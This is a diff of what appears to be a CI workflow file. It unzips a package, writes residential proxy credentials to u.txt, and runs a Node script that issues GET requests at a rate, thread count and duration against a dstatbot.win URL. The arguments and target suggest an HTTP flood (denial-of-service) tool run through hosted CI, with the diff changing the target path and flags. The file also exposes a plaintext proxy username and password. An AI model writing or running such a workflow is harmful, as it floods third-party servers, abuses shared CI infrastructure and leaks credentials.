@@ -36,7 +36,7 @@ jobs:
           unzip Fc-main.zip
           cd Fc-main
           echo "proxy.geonode.io:9000:geonode_MhAy3Bp9uf-type-residential:d67e971d-9063-4310-86e0-0e9e4f5ad567" > u.txt
-          node a.js GET  https://c4.dstatbot.win/J4MhuZuk 700 4 90 u.txt --full --bfm true --auth true --debug
+          node a.js GET  https://c4.dstatbot.win/7L5RY2sy 700 4 90 u.txt --full  true --auth true --debug
 
           
           
